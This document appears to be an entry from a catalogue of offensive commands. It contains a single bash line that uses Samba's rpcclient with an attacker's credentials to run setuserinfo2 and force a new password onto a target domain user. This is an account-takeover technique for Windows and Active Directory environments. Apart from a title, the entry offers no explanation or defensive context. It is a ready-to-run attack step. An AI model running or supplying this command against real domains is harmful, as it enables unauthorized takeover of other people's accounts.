---
id: 3f06a5b3-738f-48fb-8df8-f0d604bf5bfa
name: Using rpcclient from the Samba software suite
type: command
executor: bash
data: rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user
  23 target_newpwd"
output: null
created_at: '2023-04-06T03:56:07.010060+00:00'
updated_at: '2023-04-10T20:26:38.109512+00:00'
---

# Using rpcclient from the Samba software suite

```bash
rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd"
```


